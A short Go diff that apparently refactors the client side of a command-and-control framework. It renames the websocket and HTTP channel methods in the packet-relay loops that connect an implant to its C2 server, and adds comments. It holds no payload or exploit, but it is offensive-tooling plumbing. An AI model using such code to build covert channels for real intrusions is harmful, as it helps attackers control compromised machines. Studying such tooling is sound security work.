@@ -44,7 +44,7 @@ func MakeUpstreamManager(config *ClientConfig, campaign *campaign.Campaign) Upst
 	return u
 }
 
-// Connect will until the C2 can be reached
+// Connect will until the C2 can be reached. This is basically the client/entry of the actual Upstream
 func (d *UpstreamManager) Connect() error {
 	if d.campaign.ClientUseWebsocket {
 		// Try: Websocket
@@ -54,14 +54,15 @@ func (d *UpstreamManager) Connect() error {
 		}
 		d.UpstreamWs.Start()
 
+		// The Main Loop
 		var packet model.Packet
 		go func() {
 			for {
-				packet = <-d.UpstreamWs.Channel()
+				packet = <-d.UpstreamWs.ChanIncoming()
 				d.Channel <- packet
 
 				packet = <-d.Channel
-				d.UpstreamWs.OobChannel() <- packet
+				d.UpstreamWs.ChanOutgoing() <- packet
 			}
 		}()
 
@@ -74,14 +75,15 @@ func (d *UpstreamManager) Connect() error {
 		}
 		d.UpstreamHttp.Start()
 
+		// The Main Loop
 		var packet model.Packet
 		go func() {
 			for {
-				packet = <-d.UpstreamHttp.Channel()
+				packet = <-d.UpstreamHttp.ChanIncoming()
 				d.Channel <- packet
 
 				packet = <-d.Channel
-				d.UpstreamHttp.OobChannel() <- packet
+				d.UpstreamHttp.ChanOutgoing() <- packet
 			}
 		}()
 
@@ -95,9 +97,9 @@ func (d *UpstreamManager) Connect() error {
 
 func (d *UpstreamManager) SendOutofband(packet model.Packet) error {
 	if d.UpstreamWs.Connected() {
-		d.UpstreamWs.OobChannel() <- packet
+		d.UpstreamWs.ChanOutgoing() <- packet
 	} else if d.UpstreamHttp.Connected() {
-		d.UpstreamHttp.OobChannel() <- packet
+		d.UpstreamHttp.ChanOutgoing() <- packet
 	} else {
 		log.Warn("OOB: No active upstreams, dont send")
 	}
